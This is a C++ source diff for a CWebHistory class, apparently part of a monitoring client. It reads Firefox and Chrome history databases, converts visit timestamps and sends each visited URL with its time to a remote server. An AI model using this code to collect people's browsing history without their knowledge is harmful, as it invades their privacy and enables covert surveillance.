@@ -13,6 +13,7 @@ CWebHistory::CWebHistory(void)
 {
 	m_bBrowserType = 0;
 	m_bInit = FALSE;
+	m_bOldVersionChrome = TRUE;
 	memset(m_strHistoryPath, 0, sizeof(m_strHistoryPath));
 	memset(m_strHistoryTempPath, 0, sizeof(m_strHistoryTempPath));
 }
@@ -31,7 +32,7 @@ BOOL CWebHistory::Initialize(BYTE iBrowserType)
 	}
 	else if ( m_bBrowserType == CHROME_BROWSER)
 	{
-		InitializeForChrome();
+		InitializeForChrome(TRUE);
 	}
 
 	if (m_bInit)
@@ -65,7 +66,6 @@ BOOL CWebHistory::GetLastID()
 		db.Close();
 		if(bRet)
 		{
-			AfxMessageBox(m_strHistoryPath);
 			wmemset(m_strHistoryTempPath, 0, MAX_PATH);
 			_stprintf(m_strHistoryTempPath, _T("%s"), m_strHistoryPath);
 			return bRet;
@@ -94,8 +94,6 @@ BOOL CWebHistory::GetLastID()
 			db.Close();
 		}
 		DeleteFile(m_strHistoryTempPath);
-		AfxMessageBox(m_strHistoryTempPath);
-
 	}
 
 	return bRet;
@@ -132,23 +130,37 @@ void CWebHistory::UpdateURL()
 			LPCTSTR strURL;
 			int		iRowCount,
 					i = 0;
-			if(m_bBrowserType == CHROME_BROWSER && !m_bOldVersionChrome)
-			{
-				strQuery.Format(_T("SELECT %s, %s FROM %s WHERE %s > %s ORDER BY %s ASC"),
-																	m_strHistoryTableID,
-																	m_strSelectName,
-																	m_strHistoryTable,
-																	m_strHistoryTableID,
-																	m_strLastID,
-																	m_strHistoryTableID);
 
-			}
-			else
+			if(m_bBrowserType == FIREFOX_BROWSER)
 			{
-				strQuery.Format(_T("SELECT %s, %s FROM %s, %s WHERE %s = %s AND %s > %s ORDER BY %s ASC"), m_strHistoryTableID, m_strSelectName, m_strHistoryTable, m_strWebAddressTable, m_strHistoryTableWebID, m_strWebAddressTableID, m_strHistoryTableID, m_strLastID, m_strHistoryTableID);
+				strQuery.AppendFormat(_T("SELECT %s, %s, datetime(%s/1000000,'unixepoch','localtime') "), m_strHistoryTableID, m_strSelectName, m_strSelectDatetime );
+				strQuery.AppendFormat(_T("FROM %s, %s "), m_strHistoryTable, m_strWebAddressTable);
+				strQuery.AppendFormat(_T("WHERE %s = %s AND %s > %s ORDER BY %s ASC"),m_strHistoryTableWebID, m_strWebAddressTableID, m_strHistoryTableID, m_strLastID, m_strHistoryTableID);
 			}
-			//strTemp.AppendFormat(_T("%s"), m_strHistoryTempPath);
-			//AfxMessageBox(strTemp);
+			else if(m_bBrowserType == CHROME_BROWSER)
+			{
+				if(m_bOldVersionChrome)
+				{
+					strQuery.AppendFormat(_T("SELECT %s, %s, datetime(%s/1000000 - 11644473600,'unixepoch','localtime') "), m_strHistoryTableID, m_strSelectName, m_strSelectDatetime );
+					strQuery.AppendFormat(_T("FROM %s, %s "), m_strHistoryTable, m_strWebAddressTable);
+					strQuery.AppendFormat(_T("WHERE %s = %s AND %s > %s ORDER BY %s ASC"),m_strHistoryTableWebID, m_strWebAddressTableID, m_strHistoryTableID, m_strLastID, m_strHistoryTableID);
+				
+				}
+				else
+				{
+					strQuery.Format(_T("SELECT %s, %s,'' FROM %s WHERE %s > %s ORDER BY %s ASC"),
+						m_strHistoryTableID,
+						m_strSelectName,
+						m_strHistoryTable,
+						m_strHistoryTableID,
+						m_strLastID,
+						m_strHistoryTableID);
+				}
+			}
+			
+			//strQuery.Format(_T("SELECT %s, datetime(moz_historyvisits.visit_date/1000000 ,'unixepoch',  'localtime'), %s FROM %s, %s WHERE %s = %s AND %s > %s ORDER BY %s ASC"), m_strHistoryTableID, m_strSelectName, m_strHistoryTable, m_strWebAddressTable, m_strHistoryTableWebID, m_strWebAddressTableID, m_strHistoryTableID, m_strLastID, m_strHistoryTableID);
+			
+			
 			SQLite::TablePtr table = db.QuerySQL2(strQuery);
 			db.CommitTransaction();
 			
@@ -157,12 +169,15 @@ void CWebHistory::UpdateURL()
 			while (i < iRowCount)
 			{
 				m_strLastID = table.m_pTable->GetValue(0);
+				
 				strURL = table.m_pTable->GetValue(1);
+				
+				CString strTemp(strURL);
+				strURL = table.m_pTable->GetValue(2);
+				strTemp.AppendFormat(_T(";%s"), strURL);
 				if (strPreURL.CompareNoCase(strURL) != 0)
 				{
-					g_Connect.SendMsgToServer(VCM_WEB_HISTORY, 0, strURL );
-					
-					//AfxMessageBox(strURL);
+					g_Connect.SendMsgToServer(VCM_WEB_HISTORY, 0, strTemp.GetBuffer());
 				}
 				strPreURL = strURL;
 				table.m_pTable->GoNext();
@@ -188,6 +203,7 @@ BOOL CWebHistory::InitializeForFirefox()
 	m_strHistoryTableWebID = _T("moz_historyvisits.place_id");
 	m_strHistoryTableID = _T("moz_historyvisits.id");
 	m_strWebAddressTableID = _T("moz_places.id");
+	m_strSelectDatetime = _T("moz_places.last_visit_date");
 	m_strLastID = _T("0");
 
 	TCHAR strPath[MAX_PATH] = {0};
@@ -207,7 +223,6 @@ BOOL CWebHistory::InitializeForFirefox()
 			{
 				_stprintf(m_strHistoryTempPath, _T("%s\\FirefoxHistoryTemp.dat"), strPath);
 				m_bInit = TRUE;
-				//AfxMessageBox(_T("Get temp path"));
 			}
 		}
 	}
@@ -224,6 +239,7 @@ BOOL CWebHistory::InitializeForChrome( const BOOL& bOldVersion /*= FALSE*/ )
 	m_strHistoryTableWebID.Empty();
 	m_strHistoryTableID.Empty();
 	m_strWebAddressTableID.Empty();
+	m_strSelectDatetime.Empty();
 	m_strLastID.Empty();
 
 	TCHAR strPath[MAX_PATH] = {0};
@@ -264,6 +280,7 @@ BOOL CWebHistory::InitializeForChrome( const BOOL& bOldVersion /*= FALSE*/ )
 	else
 	{
 		m_strSelectName = _T("urls.url");
+		m_strSelectDatetime = _T("visits.visit_time");
 		m_strHistoryTable = _T("visits");
 		m_strWebAddressTable = _T("urls");
 		m_strHistoryTableWebID = _T("visits.url");
